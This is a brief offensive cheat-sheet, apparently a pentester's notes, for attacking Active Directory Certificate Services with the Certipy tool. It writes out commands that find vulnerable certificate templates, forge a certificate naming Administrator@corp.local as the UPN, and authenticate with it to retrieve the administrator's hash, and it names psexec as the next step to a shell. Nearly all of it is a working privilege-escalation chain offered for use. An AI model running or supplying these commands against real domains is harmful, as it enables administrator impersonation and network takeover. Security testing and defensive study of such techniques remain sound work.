<https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage>

Find vulnerabilities in ADCS:
certipy-ad find -u test@test.local -p 'test' -dc-ip $target  -vulnerable -stdout

certipy-ad find -u test@test.local -p 'test' -dc-ip $target -text -output certs

cat -n certs_Certipy.txt | grep -iC4 'enrollment rights' | grep -viE "Enterprise Admins|Domain Admins|Domain Controllers" | fgrep -i '\'

Forge certificate:
certipy req -u 'test@test.local' -p 'test!' -dc-ip '10.0.0.100' -target 'CA.TEST.LOCAL' -ca 'TEST-CA' -template 'UserTemplate' -upn 'Administrator@corp.local'
    
Get hash for specific user:
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'

get shell with psexec next

Here's info on all the attacks:
<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation>

